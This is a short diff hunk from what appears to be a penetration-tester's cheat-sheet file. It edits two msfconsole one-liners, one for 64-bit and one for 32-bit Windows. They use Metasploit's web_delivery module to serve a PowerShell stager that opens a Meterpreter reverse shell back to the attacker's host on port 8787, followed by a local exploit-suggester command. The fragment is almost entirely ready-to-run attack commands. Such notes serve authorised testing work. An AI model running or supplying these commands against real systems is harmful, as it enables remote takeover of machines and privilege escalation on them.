@@ -1212,10 +1212,10 @@ services.msc
 [*] Meterpreter
 +---------- Initial Shell ----------+
 64-Bit
-msfconsole -q -x 'use exploit/multi/script/web_delivery; set LPORT 8787; set LHOST $MYIP; set TARGET PSH; set PAYLOAD windows/x64/meterpreter/reverse_tcp; run'
+msfconsole -q -x 'use exploit/multi/script/web_delivery; setg SESSION 1; set LPORT 8787; setg LHOST $MYIP; set TARGET PSH; setg PAYLOAD windows/x64/meterpreter/reverse_tcp; run'
 
 32-Bit
-msfconsole -q -x 'use exploit/multi/script/web_delivery; set LPORT 8787; set LHOST $MYIP; set TARGET PSH; set PAYLOAD windows/meterpreter/reverse_tcp; run'
+msfconsole -q -x 'use exploit/multi/script/web_delivery; setg SESSION 1; set LPORT 8787; setg LHOST $MYIP; set TARGET PSH; setg PAYLOAD windows/meterpreter/reverse_tcp; run'
 
 +---------- Exploit Suggester ----------+
 run multi/recon/local_exploit_suggester
